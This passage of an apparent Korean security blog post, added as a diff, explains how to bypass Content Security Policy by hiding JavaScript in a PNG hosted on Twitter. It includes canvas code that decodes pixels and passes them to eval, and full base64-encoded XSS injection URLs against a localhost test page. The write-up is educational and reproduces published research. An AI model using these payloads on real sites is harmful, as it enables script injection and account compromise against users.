+    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.</span><span class="se">\</span><span class="s2">
+    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.</span><span class="se">\</span><span class="s2">
+    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.</span><span class="se">\</span><span class="s2">
+    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.</span><span class="se">\</span><span class="s2">
+    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.</span><span class="se">\</span><span class="s2">
+    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.</span><span class="se">\</span><span class="s2">
+    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.</span><span class="se">\</span><span class="s2">
+    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.</span><span class="se">\</span><span class="s2">
+    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.</span><span class="se">\</span><span class="s2">
+    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.</span><span class="se">\</span><span class="s2">
+    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.</span><span class="se">\</span><span class="s2">
+    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.</span><span class="se">\</span><span class="s2">
+    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.</span><span class="se">\</span><span class="s2">
+    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.</span><span class="se">\</span><span class="s2">
+    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.</span><span class="se">\</span><span class="s2">
+    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.</span><span class="se">\</span><span class="s2">
+    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.</span><span class="se">\</span><span class="s2">
+    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.</span><span class="se">\</span><span class="s2">
+    Vestibulum tincidunt diam vel diam semper posuere. Nulla facilisi. Curabitur a facilisis lorem, eu porta leo. Sed pharetra eros et malesuada mattis. Donec tincidunt elementum mauris quis commodo. Donec nec vulputate nulla. Nunc luctus orci lacinia nunc sodales, vitae cursus quam tempor. Cras ullamcorper ullamcorper urna vitae pulvinar. Curabitur ac pretium felis. Vivamus vel scelerisque nisi. Pellentesque lacinia consequat nibh, vitae rhoncus tellus faucibus eget. Ut pulvinar est non tellus tristique sodales. Aenean eget velit non turpis tristique pretium id eu dolor. Nulla sed eros quis urna facilisis scelerisque. Nam orci neque, finibus eget odio et, elementum finibus erat.*/</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">encode</span><span class="p">(</span><span class="nx">stringenc</span><span class="p">),</span> <span class="nx">b</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">)</span>
+<span class="p">})();</span>
+</code></pre></div></div>
+
+<p><a href="https://pbs.twimg.com/media/EXUmOTmUcAAHGtS?format=png&amp;name=120x120">https://pbs.twimg.com/media/EXUmOTmUcAAHGtS?format=png&amp;name=120x120</a></p>
+
+<p><a href="https://pbs.twimg.com/media/EXUmOTmUcAAHGtS?format=png&amp;name=120x120"><code class="highlighter-rouge">https://pbs.twimg.com/media/EXUmOTmUcAAHGtS?format=png&amp;name=120x120</code></a></p>
+
+<p><img src="/assets/2010sam3.png" alt="/assets/2010sam3.png" /></p>
+
+<p>이미지에서 문자열을 추출하였을 때 원래 작성한 JS코드가 확인됩니다.</p>
+
+<hr />
+
+<h2 id="exploit">Exploit</h2>
+
+<p>CSP를 우회하기 위해서 기존에 이미지에서 문자열을 뽑아내는 Javascript 코드를 일부 수정해야합니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsimg</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="o">**</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">canvas</span><span class="dl">"</span><span class="p">);</span><span class="o">**</span>
+<span class="kd">var</span> <span class="nx">cs</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">style</span><span class="p">,</span>
+    <span class="nx">cx</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="dl">"</span><span class="s2">2d</span><span class="dl">"</span><span class="p">),</span>
+    <span class="nx">w</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">offsetWidth</span><span class="p">,</span>
+    <span class="nx">h</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">offsetHeight</span><span class="p">;</span>
+<span class="nx">c</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="nx">w</span><span class="p">;</span>
+<span class="nx">c</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="nx">h</span><span class="p">;</span>
+<span class="nx">cs</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="nx">w</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">px</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">cs</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="nx">h</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">px</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">cx</span><span class="p">.</span><span class="nx">drawImage</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">cx</span><span class="p">.</span><span class="nx">getImageData</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">w</span><span class="p">,</span> <span class="nx">h</span><span class="p">).</span><span class="nx">data</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
+    <span class="nx">l</span> <span class="o">=</span> <span class="nx">x</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+    <span class="nx">p</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">l</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">0</span><span class="p">])</span> <span class="nx">a</span> <span class="o">+=</span> <span class="nx">s</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="nx">a</span> <span class="o">+=</span> <span class="nx">s</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">])</span> <span class="nx">a</span> <span class="o">+=</span> <span class="nx">s</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="nb">eval</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>위 코드를 base64로 인코딩 후, 테스트 웹 사이트에서 동작할 수 있도록 적절한 구문을 작성합니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Image src : https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FEXUmOTmUcAAHGtS%3Fformat%3Dpng%26name%3D120x120%22
+
+Javascript Code : onload=%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27
+
+http://localhost/test.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FEXUmOTmUcAAHGtS%3Fformat%3Dpng%26name%3D120x120%22+id=%22jsimg%22+onload=%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27%3E%3Ca+href=%22
+</code></pre></div></div>
+
+<p>파란색 부분은 img 태그의 src 속성에 들어갈 Twitter의 이미지 주소, 빨간색 부분은 base64로 인코딩된 이미지에서 JS 코드를 추출하여 실행하는 코드입니다.</p>
+
+<p><img src="/assets/2010sam4.png" alt="/assets/2010sam4.png" /></p>
+
+<p>cross-origin 에러가 발생합니다.</p>
+
+<blockquote>
+  <p>HTML은 이미지에 crossorigin 속성을 제공하는데, 이 속성은 이미지를 <code class="highlighter-rouge">img</code> 태그를 사용하여 외부의 이미지를 <code class="highlighter-rouge">&lt;canvas&gt;</code> 를 사용하여 정의할 수 있도록 합니다.</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crossorigin=%22anonymous%22
+
+http://localhost/test.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FEXUmOTmUcAAHGtS%3Fformat%3Dpng%26name%3D120x120%22+crossorigin=%22anonymous%22+id=%22jsimg%22+onload=%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27%3E%3Ca+href=%22
+</code></pre></div></div>
+
+<p>보라색의 코드를 추가로 넣어서 진행할 경우</p>
+
+<p><img src="/assets/2010sam5.png" alt="/assets/2010sam5.png" /></p>
+
+<p>별도의 error 없이 JavaScript 코드가 실행됨을 확인 할 수 있습니다.</p>
+
+<hr />
+
+<h2 id="마치며">마치며</h2>
+
+<p>해당 문서에서 기술한 내용은 CSP의 정책이 강력하지 않고, Twitter에 업로드된 이미지에 대해 와일드 카드 액세스 response header를 사용하기 때문에 가능하다고 합니다.</p>
+
+<p>해외 블로그에 개제된 내용을 번역하여 실제 따라해본 과정을 담고 있습니다.</p>
+
+<hr />
+
+<h2 id="참고">참고</h2>
+
+<ul>
+  <li><a href="https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/">https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/</a></li>
+  <li><a href="https://hackernoon.com/host-a-web-app-on-twitter-in-a-single-tweet-9aed28bdb350">https://hackernoon.com/host-a-web-app-on-twitter-in-a-single-tweet-9aed28bdb350</a></li>
+</ul>
+
+   </div>
+</div>
+
+
+  <!-- Start disqus 
+<script src="/assets/js/disqusLoader.js" /></script>
+<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
+<div class="disqus"></div>
+<script>
+    disqusLoader('.disqus', {
+        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+End disqus -->
+
+
+<div class="pagination">
+  
+   <a href="/2020-10-01/Midnightsun-CTF-Final-Maze-WriteUp-3d95f806977a4a09a3c265a00e98d62d" class="left arrow">&#8592;</a>
+  
+  
+   <a href="/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+    </main>
+
+    <!--footer>
+  <span>
+    &copy; <time datetime="2020-10-13 11:20:23 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+  </span>
+</footer-->
+
+  </body>
+</html>
